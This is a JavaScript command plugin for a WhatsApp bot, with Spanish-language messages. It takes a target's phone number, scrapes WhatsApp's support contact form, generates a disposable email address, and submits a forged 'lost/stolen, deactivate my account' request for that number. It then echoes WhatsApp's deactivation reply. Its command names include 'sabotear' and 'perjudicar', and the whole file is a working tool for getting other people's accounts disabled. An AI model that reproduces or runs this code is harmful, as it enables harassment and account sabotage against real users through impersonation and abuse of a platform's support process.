import cheerio from "cheerio";
import axios from "axios";
import util from 'util';

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
    const q = args.join(" ");
    if (!q || !args[0]) throw '🌹¿𝐶𝑢𝑎𝑙 𝑛𝑢𝑚𝑒𝑟𝑜 𝑒𝑗𝑒𝑐𝑢𝑡𝑜?';

    let ntah;
    try {
        ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
    } catch (error) {
        return m.reply('⚠️ Error al obtener la URL de WhatsApp.');
    }

    let email;
    try {
        email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10");
    } catch (error) {
        return m.reply('⚠️ Error al obtener un correo electrónico aleatorio.');
    }

    let cookie = ntah.headers["set-cookie"].join("; ");
    let $ = cheerio.load(ntah.data);
    let $form = $("form");
    let url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
    let form = new URLSearchParams();

    form.append("jazoest", $form.find("input[name=jazoest]").val());
    form.append("lsd", $form.find("input[name=lsd]").val());
    form.append("step", "submit");
    form.append("country_selector", "ID");
    form.append("phone_number", q);
    form.append("email", email.data[0]);
    form.append("email_confirm", email.data[0]);
    form.append("platform", "ANDROID");
    form.append("your_message", "Perdido/roubado: desative minha conta: " + q);
    form.append("__user", "0");
    form.append("__a", "1");
    form.append("__csr", "");
    form.append("__req", "8");
    form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
    form.append("dpr", "1");
    form.append("__ccg", "UNKNOWN");
    form.append("__rev", "1006630858");
    form.append("__comment_req", "0");

    let res;
    try {
        res = await axios({ url, method: "POST", data: form, headers: { cookie } });
    } catch (error) {
        return m.reply('⚠️ Error al enviar la solicitud.');
    }

    var payload = String(res.data);
    if (payload.includes(`"payload":true`)) {
        m.reply(`❕sakurazawa❕\
\
##- WhatsApp Support -##\
\
Hola,\
\
Gracias por tu mensaje.\
\
Hemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\
\
Durante el periodo de cierre:\
  Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\
  Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\
\
Si desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.`);
    } else if (payload.includes(`"payload":false`)) {
        m.reply(`❕Sakurazawa❕\
\
##- WhatsApp Support -##\
\
Hola:\
\
Gracias por tu mensaje.\
\
Para proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.`);
    } else {
        m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))));
    }
};

handler.tags = ['owner'];
handler.command = /^(whatsappsp|orden|sabotear|perjudicar|desactivar|manipular|protocolo|alterar)$/i;
handler.rowner = true;

export default handler;
